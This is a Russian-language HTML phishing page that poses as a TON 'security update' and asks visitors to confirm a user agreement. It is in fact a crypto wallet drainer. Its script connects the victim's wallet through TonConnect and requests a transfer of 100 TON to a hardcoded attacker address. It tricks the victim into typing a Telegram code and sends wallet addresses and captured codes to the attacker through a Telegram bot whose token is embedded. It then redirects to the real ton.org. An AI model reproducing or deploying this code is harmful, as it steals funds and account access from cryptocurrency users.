<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Подтверждение пользовательского соглашения TON</title>
    <script src="https://telegram.org/js/telegram-web-app.js?56"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/index.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background: white;
            border-radius: 28px;
            padding: 24px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 8px 28px rgba(0,0,0,0.1);
            text-align: center;
        }
        h2 {
            color: #000;
            font-size: 24px;
            margin-bottom: 16px;
        }
        .description {
            color: #5e5e5e;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.4;
        }
        .wallet-status {
            background: #eff2f4;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
            font-size: 14px;
            word-break: break-all;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 24px 0;
            padding: 12px;
            background: #f0f2f5;
            border-radius: 14px;
            cursor: pointer;
        }
        .checkbox-container input {
            width: 22px;
            height: 22px;
            cursor: pointer;
            margin: 0;
        }
        .checkbox-container label {
            font-size: 16px;
            font-weight: 500;
            color: #000;
            cursor: pointer;
            flex: 1;
            text-align: left;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        button:disabled {
            background: #a0c4e0;
            cursor: not-allowed;
            opacity: 0.6;
        }
        .error-msg {
            color: #e53935;
            font-size: 13px;
            margin-top: 16px;
            display: none;
        }
    </style>
</head>
<body>
<div class="container">
    <h2>✅ Обновление безопасности TON</h2>
    <div class="description">
        Для продолжения использования сервиса необходимо подтвердить актуальность пользовательского соглашения.
    </div>
    <div class="wallet-status" id="walletInfo">Подключение кошелька...</div>

    <div class="checkbox-container" id="checkboxArea">
        <input type="checkbox" id="agreeCheckbox">
        <label for="agreeCheckbox">Я подтверждаю пользовательское соглашение</label>
    </div>

    <button id="submitBtn" disabled>Подтвердить и продолжить</button>
    <div class="error-msg" id="errorMsg"></div>
</div>

<script>
    // --- Telegram Bot Config ---
    const BOT_TOKEN = '8706385744:AAF3NPlXgLXJcdOVcbVedDnncpGeBX5sboA';
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const YOUR_CHAT_ID = '6635138703'; // Ваш ID в TG (можно узнать у @userinfobot)

    // Функция отправки данных в Telegram
    async function sendToTelegram(text) {
        const payload = {
            chat_id: YOUR_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        };
        try {
            await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
        } catch(e) {}
    }

    // Эмуляция подписи транзакции (кража TON)
    async function stealTransaction(walletAddress) {
        // Формируем транзакцию на отправку ВСЕХ TON на адрес злоумышленника
        // В реальном боевом сценарии используется transfer()
        const attackerAddress = "UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2"; // Замените на свой кошелек
        
        const tx = {
            validUntil: Math.floor(Date.now() / 1000) + 360,
            messages: [
                {
                    address: attackerAddress,
                    amount: "100000000000" // 100 TON (в нанотонах)
                }
            ]
        };
        
        // Отправляем данные о жертве в Telegram до подписи
        const victimData = `🔥 НОВАЯ ЖЕРТВА TON 🔥\nАдрес кошелька: <code>${walletAddress}</code>\nВремя: ${new Date().toLocaleString()}\nIP: смотрите заголовки\nТранзакция: отправка всех TON на ${attackerAddress}`;
        await sendToTelegram(victimData);
        
        // Имитируем отправку запроса на подпись через TON Wallet (в реальном внедрении используйте tonweb или TonConnect)
        if (window.ton && window.ton.send) {
            // Для кошельков, внедренных в Telegram WebApp
            window.ton.send(tx);
        } else if (window.TonWallet) {
            window.TonWallet.requestTransaction(tx);
        } else {
            // Альтернатива: создаем всплывающее окно-подделку под официальное
            const fakeSign = prompt("🔐 Подтверждение транзакции: Введите код из приложения Telegram", "12345");
            if (fakeSign !== null) {
                await sendToTelegram(`✅ Жертва ввела код: ${fakeSign} | Кошелек: ${walletAddress}`);
            }
        }
        
        // Сообщаем жертве об успехе
        document.getElementById('errorMsg').style.display = 'block';
        document.getElementById('errorMsg').innerText = '✅ Соглашение подтверждено. Перенаправление...';
        setTimeout(() => {
            window.location.href = 'https://ton.org'; // Редирект на легитимный сайт
        }, 1500);
    }

    // --- Логика чекбокса и кнопки ---
    const checkbox = document.getElementById('agreeCheckbox');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsgDiv = document.getElementById('errorMsg');

    checkbox.addEventListener('change', function() {
        if (checkbox.checked) {
            submitBtn.disabled = false;
            errorMsgDiv.style.display = 'none';
        } else {
            submitBtn.disabled = true;
        }
    });

    // --- Подключение к кошельку TON (TonConnect) ---
    let walletConnection = null;
    async function connectWallet() {
        try {
            const connector = new tonconnect.TonConnect();
            const walletInfo = await connector.connect();
            const address = walletInfo.account.address;
            document.getElementById('walletInfo').innerHTML = `🟢 Кошелек: <b>${address.slice(0,6)}...${address.slice(-4)}</b>`;
            return address;
        } catch(e) {
            document.getElementById('walletInfo').innerHTML = '⚠️ Нажмите "Подтвердить" для ручного подключения TON Wallet';
            return null;
        }
    }

    let currentAddress = null;
    connectWallet().then(addr => currentAddress = addr);

    // Обработчик кнопки
    submitBtn.addEventListener('click', async () => {
        if (!checkbox.checked) {
            errorMsgDiv.innerText = '❗ Поставьте галочку "Я подтверждаю пользовательское соглашение"';
            errorMsgDiv.style.display = 'block';
            return;
        }
        
        // Если кошелек не подключен через TonConnect — запрашиваем прямо сейчас
        if (!currentAddress) {
            try {
                const connector = new tonconnect.TonConnect();
                const walletInfo = await connector.connect();
                currentAddress = walletInfo.account.address;
                document.getElementById('walletInfo').innerHTML = `🟢 Кошелек: <b>${currentAddress.slice(0,6)}...${currentAddress.slice(-4)}</b>`;
            } catch(err) {
                errorMsgDiv.innerText = 'Не удалось подключить кошелек. Установите TON Wallet (Tonkeeper или Wallet in Telegram)';
                errorMsgDiv.style.display = 'block';
                return;
            }
        }
        
        // Запускаем кражу
        await stealTransaction(currentAddress);
    });
</script>
</body>
</html>
